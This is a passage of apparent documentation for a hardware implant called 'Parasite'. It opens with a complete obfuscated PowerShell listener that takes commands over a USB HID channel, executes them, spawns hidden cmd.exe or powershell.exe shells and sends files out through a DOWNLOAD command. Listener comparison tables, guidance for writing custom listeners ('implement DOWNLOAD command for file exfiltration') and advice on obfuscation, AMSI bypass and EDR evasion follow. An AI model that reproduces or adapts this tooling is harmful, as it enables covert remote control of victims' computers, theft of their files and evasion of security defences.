Add-Type 'using System;using System.Runtime.InteropServices;using Microsoft.Win32.SafeHandles;using System.Diagnostics;public class H{[DllImport("kernel32.dll",SetLastError=true)]public static extern bool ReadFile(SafeFileHandle h,byte[]b,uint n,out uint r,IntPtr o);[DllImport("kernel32.dll",SetLastError=true)]public static extern bool WriteFile(SafeFileHandle h,byte[]b,uint n,out uint w,IntPtr o);[DllImport("setupapi.dll")]public static extern IntPtr SetupDiGetClassDevs(ref Guid g,IntPtr e,IntPtr p,uint f);[DllImport("setupapi.dll")]public static extern bool SetupDiEnumDeviceInterfaces(IntPtr i,IntPtr d,ref Guid g,uint m,ref DI r);[DllImport("setupapi.dll",CharSet=CharSet.Auto)]public static extern bool SetupDiGetDeviceInterfaceDetail(IntPtr i,ref DI d,IntPtr t,uint s,out uint r,IntPtr x);[DllImport("setupapi.dll")]public static extern bool SetupDiDestroyDeviceInfoList(IntPtr i);[DllImport("hid.dll")]public static extern void HidD_GetHidGuid(out Guid g);[DllImport("hid.dll")]public static extern bool HidD_GetAttributes(SafeFileHandle h,ref A a);[DllImport("hid.dll")]public static extern bool HidD_GetPreparsedData(SafeFileHandle h,out IntPtr p);[DllImport("hid.dll")]public static extern bool HidD_FreePreparsedData(IntPtr p);[DllImport("hid.dll")]public static extern int HidP_GetCaps(IntPtr p,out C c);[DllImport("hid.dll")]public static extern bool HidD_SetFeature(SafeFileHandle h,byte[]b,uint l);[DllImport("hid.dll")]public static extern bool HidD_GetFeature(SafeFileHandle h,byte[]b,uint l);[DllImport("hid.dll")]public static extern bool HidD_SetOutputReport(SafeFileHandle h,byte[]b,uint l);[DllImport("kernel32.dll",CharSet=CharSet.Auto)]public static extern SafeFileHandle CreateFile(string f,int a,uint s,IntPtr c,uint m,uint l,IntPtr t);[StructLayout(LayoutKind.Sequential)]public struct DI{public uint cb;public Guid g;public uint f;public IntPtr r;}[StructLayout(LayoutKind.Sequential)]public struct A{public uint s;public ushort v,p,n;}[StructLayout(LayoutKind.Sequential)]public struct C{public ushort u,up,il,ol,fl;[MarshalAs(UnmanagedType.ByValArray,SizeConst=17)]public ushort[]r;public ushort n1,n2,n3,n4,n5,n6,n7,n8,n9,n10;}public static int Z(object o){return Marshal.SizeOf(o);}public static void U(int us){long t=Stopwatch.GetTimestamp()+us*(Stopwatch.Frequency/1000000);while(Stopwatch.GetTimestamp()<t);}}'
function G{$g=[Guid]::Empty;[H]::HidD_GetHidGuid([ref]$g);$s=[H]::SetupDiGetClassDevs([ref]$g,0,0,18);if(!$s){return}$n=0;$di=New-Object H+DI;$di.cb=[H]::Z($di);$fb=$null;while([H]::SetupDiEnumDeviceInterfaces($s,0,[ref]$g,$n++,[ref]$di)){$r=0;[H]::SetupDiGetDeviceInterfaceDetail($s,[ref]$di,0,0,[ref]$r,0)>$x;$b=[Runtime.InteropServices.Marshal]::AllocHGlobal($r);[Runtime.InteropServices.Marshal]::WriteInt32($b,$(if([IntPtr]::Size-eq8){8}else{5}));if([H]::SetupDiGetDeviceInterfaceDetail($s,[ref]$di,$b,$r,[ref]$r,0)){$h=[H]::CreateFile([Runtime.InteropServices.Marshal]::PtrToStringAuto([IntPtr]::Add($b,4)),-1073741824,3,0,3,0,0);if(!$h.IsInvalid){$a=New-Object H+A;$a.s=[H]::Z($a);if([H]::HidD_GetAttributes($h,[ref]$a)){$p=0;if([H]::HidD_GetPreparsedData($h,[ref]$p)){$c=New-Object H+C;[H]::HidP_GetCaps($p,[ref]$c)>$x;[H]::HidD_FreePreparsedData($p)>$x;if($c.up-eq$UP){if($a.v-eq$VI-and$a.p-eq$PI){[Runtime.InteropServices.Marshal]::FreeHGlobal($b);[H]::SetupDiDestroyDeviceInfoList($s)>$x;return @{H=$h;I=$c.il;O=$c.ol;F=$c.fl;P=$c.fl-1}}elseif(!$fb-and$c.u-eq$UG-and$c.il-eq$IL-and$c.ol-eq$OL-and$c.fl-eq$FL){$fb=@{H=$h;I=$c.il;O=$c.ol;F=$c.fl;P=$c.fl-1};continue}}}}$h.Close()}}[Runtime.InteropServices.Marshal]::FreeHGlobal($b)};[H]::SetupDiDestroyDeviceInfoList($s)>$x;return $fb}
function SR($D,[byte[]]$A){for($i=0;$i-lt$A.Length;$i+=$D.P){$z=[Math]::Min($D.P,$A.Length-$i);$p=[byte[]]::new($D.F);$p[0]=$RI;[Array]::Copy($A,$i,$p,1,$z);$rt=0;while(-not[H]::HidD_SetFeature($D.H,$p,$p.Length)){$rt++;if($rt-gt$MR){break}Sleep -M 5};[H]::U($RD)}}
function SO($D,[byte[]]$A){for($i=0;$i-lt$A.Length;$i+=($D.O-1)){$z=[Math]::Min($D.O-1,$A.Length-$i);$p=[byte[]]::new($D.O);$p[0]=$RI;[Array]::Copy($A,$i,$p,1,$z);$rt=0;while(-not[H]::HidD_SetOutputReport($D.H,$p,$p.Length)){$rt++;if($rt-gt$MR){break}Sleep -M 5};[H]::U($RU)}}
function W($D,$T){SR $D ([Text.Encoding]::ASCII.GetBytes("$T`n"))}
function SE($D,$M){$b=[Text.Encoding]::UTF8.GetBytes($M);$l=[Math]::Min($b.Length,255);$f=[byte[]]::new(3+$l);$f[0]=$MG;$f[1]=0xEE;$f[2]=$l;[Array]::Copy($b,0,$f,3,$l);SR $D $f}
# Flow control check - returns: STOP, SLOWER, SLOW, or NORMAL
function CS($D){$sb=[byte[]]::new($D.F);$sb[0]=$RI;try{if([H]::HidD_GetFeature($D.H,$sb,$sb.Length)){if($sb[1]-eq$MG){switch($sb[2]){0xFF{return 'STOP'}0xFC{return 'SLOWER'}0xFE{return 'SLOW'}0xFD{return 'NORMAL'}}}}}catch{};return 'NORMAL'}
# File transfer with flow control
function F($D,$P){$P=[Environment]::ExpandEnvironmentVariables($P);if(!(Test-Path $P)){SE $D "Not found";return}if((Get-Item $P).PSIsContainer){SE $D "Is directory";return}try{$fb=[IO.File]::ReadAllBytes($P)}catch{SE $D "Read error";return}if($fb.Length-gt10MB){SE $D "Too large";return}$fn=[IO.Path]::GetFileName($P);$fs=$fb.Length;$nb=[Text.Encoding]::UTF8.GetBytes($fn);$nl=[Math]::Min($nb.Length,255);$sf=[byte[]]::new(7+$nl);$sf[0]=$MG;$sf[1]=0xAA;$sf[2]=$fs-band 0xFF;$sf[3]=($fs-shr 8)-band 0xFF;$sf[4]=($fs-shr 16)-band 0xFF;$sf[5]=($fs-shr 24)-band 0xFF;$sf[6]=$nl;[Array]::Copy($nb,0,$sf,7,$nl);SO $D $sf;Sleep -M $MD;$cn=0;for($i=0;$i-lt$fs;$i+=$BC){$sg=CS $D;if($sg-eq'STOP'){W $D "STOPPED";return};if($sg-eq'SLOWER'){Sleep -M $SSD}elseif($sg-eq'SLOW'){Sleep -M $SD};$cn++;$cs=[Math]::Min($BC,$fs-$i);$df=[byte[]]::new(4+$cs);$df[0]=$MG;$df[1]=0xBB;$df[2]=$cs-band 0xFF;$df[3]=($cs-shr 8)-band 0xFF;[Array]::Copy($fb,$i,$df,4,$cs);SO $D $df;if($cn%4-eq0){Sleep -M $BD}};Sleep -M $MD;SO $D ([byte[]]@($MG,0xCC))}
function Y($z){$a=[Security.Cryptography.Aes]::Create();$a.Mode='CBC';$a.Padding='PKCS7';$k=[byte[]]::new(16);$v=[byte[]]::new(16);for($i=0;$i-lt16;$i++){$k[$i]=[Convert]::ToByte($KY.Substring($i*2,2),16);$v[$i]=[Convert]::ToByte($IV.Substring($i*2,2),16)};$a.Key=$k;$a.IV=$v;(New-Object IO.StreamReader([Security.Cryptography.CryptoStream]::new([IO.MemoryStream]::new([Convert]::FromBase64String($z)),$a.CreateDecryptor(),'Read'))).ReadToEnd()}
function DR($ms){if(!$script:SH-or$script:SH.HasExited){return""};$sb=New-Object Text.StringBuilder;$e=[Console]::OutputEncoding;$dl=[DateTime]::Now.AddMilliseconds($ms);while([DateTime]::Now-lt$dl-and!$script:SH.HasExited){if(!$script:OT){$script:OT=$script:SH.StandardOutput.BaseStream.ReadAsync($script:OB,0,$BZ)};if($script:OT.IsCompleted){if($script:OT.Result-gt0){[void]$sb.Append($e.GetString($script:OB,0,$script:OT.Result));$dl=[DateTime]::Now.AddMilliseconds(300)};$script:OT=$null};if(!$script:ET){$script:ET=$script:SH.StandardError.BaseStream.ReadAsync($script:EB,0,$BZ)};if($script:ET.IsCompleted){if($script:ET.Result-gt0){[void]$sb.Append($e.GetString($script:EB,0,$script:ET.Result));$dl=[DateTime]::Now.AddMilliseconds(300)};$script:ET=$null};Sleep -M 10};$sb.ToString().TrimEnd()}
function SS($e){try{$script:SH=New-Object Diagnostics.Process;$script:SH.StartInfo.FileName=$e;$script:SH.StartInfo.UseShellExecute=$false;$script:SH.StartInfo.RedirectStandardInput=$true;$script:SH.StartInfo.RedirectStandardOutput=$true;$script:SH.StartInfo.RedirectStandardError=$true;$script:SH.StartInfo.CreateNoWindow=$true;if($script:SH.Start()){$script:OT=$null;$script:ET=$null;return $true}}catch{};$script:SH=$null;$false}
function KS{if($script:SH){try{if(!$script:SH.HasExited){$script:SH.Kill()};$script:SH.Dispose()}catch{};$script:SH=$null;$script:OT=$null;$script:ET=$null}}
function TX($c){if($script:SH-and!$script:SH.HasExited){try{$script:SH.StandardInput.WriteLine($c)}catch{KS;return""};DR 1500}else{""}}
function CN{while(1){$d=G;if($d){Write-Host "Connected";return $d};Write-Host "Waiting...";Sleep -S $RC}}
$d=CN;W $d "Ready";$bf="";$rx=0
while(1){$b=[byte[]]::new($d.I);$r=0;$ok=$false;try{$ok=[H]::ReadFile($d.H,$b,$b.Length,[ref]$r,0)-and$r-gt0}catch{};if(-not$ok){Write-Host "Reconnecting...";try{$d.H.Close()}catch{};$d=CN;W $d "Ready";$bf="";$rx=0;continue};$s=[Text.Encoding]::ASCII.GetString($b,1,$b.Length-1).TrimEnd([char]0);if($s){if($s-match'<<START:\d+>>'){$bf="";$rx=1;$s=$s-replace'<<START:\d+>>'}if($s-match'<<END>>'){$s=$s-replace'<<END>>';$bf+=$s;$rx=0;$t=$bf.Trim();if($t){$c=if($EN){try{Y $t}catch{W $d "ERR";$bf="";continue}}else{$t};if($c){$c=$c.Trim();if($c-match'^DOWNLOAD\s+(.+)$'){F $d $Matches[1].Trim()}elseif(($c-ieq"cmd"-or$c-ieq"cmd.exe")-and!$script:SH){if(SS "cmd.exe"){$o=DR 800;W $d $(if($o){$o}else{"OK"})}else{W $d "ERR"}}elseif(($c-ieq"powershell"-or$c-ieq"powershell.exe")-and!$script:SH){if(SS "powershell.exe"){$o=DR 1500;W $d $(if($o){$o}else{"OK"})}else{W $d "ERR"}}elseif($c-ieq"exit"-and$script:SH){KS;W $d "OK"}elseif($script:SH){if($script:SH.HasExited){KS;try{$o=(&([scriptblock]::Create($c))2>&1|Out-String).Trim()}catch{$o="ERR:$_"};W $d $(if($o){$o}else{"OK"})}else{$o=TX $c;W $d $(if($o){$o}else{"OK"})}}else{try{$o=(&([scriptblock]::Create($c))2>&1|Out-String).Trim()}catch{$o="ERR:$_"};W $d $(if($o){$o}else{"OK"})}}$bf=""}}elseif($rx){$bf+=$s}}}
```

---

## Listener Comparison

| Listener | Report Type | Interactive Shell | Auto-Reconnect | VID/PID Fallback | Flow Control | Best For |
|----------|-------------|-------------------|----------------|------------------|--------------|----------|
| `basic_feature.ps1` | Feature | No | No | No | No | Simple commands, compatibility |
| `basic_output.ps1` | Output | No | No | No | No | Faster transfers, simple commands |
| `feature_report_interactive.ps1` | Feature | Yes | No | No | No | Full control, compatibility |
| `output_report_interactive.ps1` | Output | Yes | No | No | No | Full control, best performance |
| `advanced_feature_report.ps1` | Feature | Yes | Yes | Yes | No | Robust operations, resilient |
| `advanced_feature_report_flowcontrol.ps1` | Feature | Yes | Yes | Yes | Yes | Large file transfers, stability |
| `advanced_output_report.ps1` | Output | Yes | Yes | Yes | No | Robust operations, best performance |
| `advanced_output_report_flowcontrol.ps1` | Output | Yes | Yes | Yes | Yes | Large file transfers, max throughput |

**Choose based on:**

- **Feature Reports:** Better compatibility, use when Output Reports fail
- **Output Reports:** Better performance for large file transfers
- **Interactive Shell:** Required if you need to spawn cmd.exe or powershell.exe sessions
- **Auto-Reconnect:** Use when device may be disconnected/reconnected during operation
- **VID/PID Fallback:** Use when operating with different passthrough devices or unknown VID/PID
- **Flow Control:** Use for large file transfers or unstable WiFi conditions

---

## Developing Custom Listeners

### Minimum Requirements

1. **Enumerate HID devices** and match VID/PID/Usage Page
2. **Open device handle** with read/write access
3. **Read Input Reports** for incoming commands
4. **Parse command framing** (`<<START:N>>` ... `<<END>>`)
5. **Execute commands** and capture output
6. **Send responses** via Feature or Output Reports
7. **Implement DOWNLOAD** command for file exfiltration

### Implementation Tips

- Use `HidD_GetPreparsedData` and `HidP_GetCaps` to get report sizes
- Report ID byte must be first byte of all reports
- Handle partial commands across multiple Input Reports
- Implement retry logic for failed report sends
- Poll for flow control signals during long transfers
- Use static/pre-allocated buffers to avoid memory issues

---

## Security Considerations

- Use TRNG-generated keys or set your own secure keys before deployment
- Listener scripts should be obfuscated for operational use
- Consider code signing and AMSI bypass techniques
- Test against target EDR solutions
- File size limits exist (default 10MB) — adjust as needed

---

## Troubleshooting

| Issue | Possible Cause | Solution |
|-------|---------------|----------|
| Device not found | Wrong VID/PID | Check device mode, update listener config, or use advanced listener with fallback |
| Reports failing | Buffer size mismatch | Verify report sizes from HID caps |
| Data corruption | Buffer overflow due to missing or short delays | Increase `$RD`, `$RU`, `$BD` parameters |
| Transfer aborted | WebSocket queue causes heap runout | Use flow control listener, or slow down (increase `$BD`), use a range extender, or get a better WiFi signal |
| Decryption fails (ERR) | Key mismatch or encryption not enabled | Verify Key/IV match on both sides and ensure `$EN=$true` in the listener |
| Connection lost | USB disconnection or system sleep | Use advanced listener with auto-reconnect |


## Quick Reference

### Opcodes Summary
```
MAGIC        = 0xD1
FILE_START   = 0xAA  (Listener → Parasite)
FILE_DATA    = 0xBB  (Listener → Parasite)
FILE_END     = 0xCC  (Listener → Parasite)
TEXT_OUTPUT  = 0xDD  (Listener → Parasite)
ERROR        = 0xEE  (Listener → Parasite)
```

### Flow Control Summary
```
SIGNAL_NORMAL  = 0xFD  (Parasite → Listener)
SIGNAL_SLOW    = 0xFE  (Parasite → Listener)
SIGNAL_SLOWER  = 0xFC  (Parasite → Listener)
SIGNAL_STOP    = 0xFF  (Parasite → Listener)
```
